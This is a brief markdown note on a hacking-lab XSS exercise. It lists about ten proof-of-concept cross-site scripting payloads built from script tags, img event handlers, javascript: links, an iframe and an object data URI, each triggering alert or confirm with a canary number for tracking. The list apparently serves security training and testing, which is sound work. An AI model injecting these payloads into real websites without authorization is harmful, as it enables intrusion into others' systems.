# hackinghub

## xss  
[https://app.hackinghub.io/hubs/nbbc-xss](https://app.hackinghub.io/hubs/nbbc-xss)    

### Example XSS Payloads  
- The number `19628397001` is just a random number that can be used as a [canary](https://portswigger.net/burp/documentation/desktop/tools/dom-invader/settings/canary) to search proxy history for the value.  

```
<script>alert(19628397001)</script>
<script>alert(19628397001)
<script>alert(19628397001);//</script>
<script>confirm(19628397001);//</script>
<img src=xxxxx onmouseover=alert(19628397001)>
<img src=xxxxx onerror=alert(19628397001)>
<a href=javascript:alert(19628397001)>xsstest</a>
<a href=javascript:alert(19628397001)>xsstest
<iframe src=javascript:alert(19628397001)>
<object data="data:text/html,<script>alert(19628397001)</script>"></object>
```


